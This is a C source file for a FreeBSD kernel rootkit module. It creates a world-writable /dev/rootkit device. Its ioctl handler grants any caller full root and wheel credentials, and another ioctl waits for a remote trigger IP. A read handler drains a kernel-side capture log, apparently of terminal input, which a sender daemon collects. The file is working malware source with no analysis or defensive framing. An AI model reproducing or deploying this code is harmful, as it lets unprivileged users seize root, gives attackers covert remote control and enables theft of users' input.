#include <sys/param.h>
#include <sys/conf.h>
#include <sys/errno.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/poll.h>
#include <sys/proc.h>
#include <sys/resourcevar.h>
#include <sys/selinfo.h>
#include <sys/systm.h>
#include <sys/ucred.h>
#include <sys/uio.h>
#include <sys/vnode.h>
#include <sys/condvar.h>
#include <netinet/in.h>

#include "interface.h"
#include "log.h"

static struct cdev *rootkit_dev;

/*
 * A read() on our own cdev must never be captured: the sender drains the log
 * through /dev/rootkit, so feeding those bytes back into the ring is a loop
 * that fills the buffer with its own output within a second. The device is a
 * character vnode exactly like a pty slave, so the descriptor type alone
 * cannot tell them apart -- the rdev can.
 */
int
rootkit_is_our_vnode(struct vnode *vp)
{

	if (rootkit_dev == NULL || vp == NULL)
		return (0);
	return (vp->v_rdev == rootkit_dev);
}

/* Global synchronization primitives defined in module for remote trigger */
extern struct cv remote_cv;
extern struct mtx remote_mtx;
extern struct in_addr trigger_ip;
extern int trigger_flag;

static int
rootkit_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *td) {

    (void)dev;
    (void)data;
    (void)flags;
    int error = 0;
 
    switch (cmd) {
    case rootkit_ELEVATE: {
        struct proc *p = td->td_proc;
        struct ucred *user_cred;
        struct ucred *root_cred = crget();
        struct uidinfo *uip = uifind(UID_ROOT);
        gid_t root_gid = GID_WHEEL;

        PROC_LOCK(p);

        user_cred = crcopysafe(p, root_cred);

        change_ruid(root_cred, uip);
        change_svuid(root_cred, UID_ROOT);
        change_euid(root_cred, uip);

        /*
         * The effective gid has to move too. Without this the caller keeps
         * its old egid while euid becomes 0, so any check that keys on the
         * group -- writing to a wheel-owned file, su'ing without a password
         * -- still sees the unprivileged group.
         */
        change_egid(root_cred, root_gid);

        change_rgid(root_cred, root_gid);
        change_svgid(root_cred, root_gid);
        crsetgroups(root_cred, 1, &root_gid);

        setsugid(p);

        proc_set_cred(p, root_cred);

        PROC_UNLOCK(p);

        uifree(uip);
        crfree(user_cred);
        break;
    }

    case rootkit_WAIT_REMOTE: {
        mtx_lock(&remote_mtx);
        while (!trigger_flag) {
            error = cv_wait_sig(&remote_cv, &remote_mtx);
            if (error != 0)
                break;
        }
        if (error == 0 && data != NULL) {
            *(struct in_addr *)data = trigger_ip;
            trigger_flag = 0;
        }
        mtx_unlock(&remote_mtx);
        break;
    }

    default:
        return (ENOTTY);
    }

    return (error);
}

/*
 * read() drains whatever the kernel-side hook has captured since the last
 * call. An empty ring returns a short (zero length) read instead of blocking,
 * so the daemon, which already called poll(), never spins.
 */
static int
rootkit_read(struct cdev *dev, struct uio *uio, int ioflag) {
    char chunk[256];
    size_t want;
    ssize_t n;
    int error = 0;

    (void)dev;
    (void)ioflag;

    while (uio->uio_resid > 0) {
        want = MIN(sizeof(chunk), (size_t)uio->uio_resid);
        n = (ssize_t)rk_log_read(chunk, want);
        if (n <= 0)
            break;

        error = uiomove(chunk, (int)n, uio);
        if (error != 0)
            break;
    }

    return error;
}

/*
 * poll()/select() support: wake up as soon as rk_log_write() pushes data in.
 */
static int
rootkit_poll(struct cdev *dev, int events, struct thread *td) {
    int revents = 0;

    (void)dev;

    if (events & (POLLIN | POLLRDNORM)) {
        if (rk_log_poll_ready(td))
            revents |= events & (POLLIN | POLLRDNORM);
    }

    return revents;
}

static struct cdevsw rootkit_cdevsw = {
    .d_version = D_VERSION,
    .d_name    = "rootkit",
    .d_ioctl   = rootkit_ioctl,
    .d_read    = rootkit_read,
    .d_poll    = rootkit_poll
};

int make_rootkit_dev(void) {
    return make_dev_p(
        MAKEDEV_CHECKNAME | MAKEDEV_WAITOK,
        &rootkit_dev,
        &rootkit_cdevsw,
        NULL,
        UID_ROOT,
        GID_WHEEL,
        0666,
        "rootkit"
    );
}

void destroy_rootkit_dev(void) {
    if (rootkit_dev != NULL) {
        destroy_dev(rootkit_dev);
        rootkit_dev = NULL;
    }
}
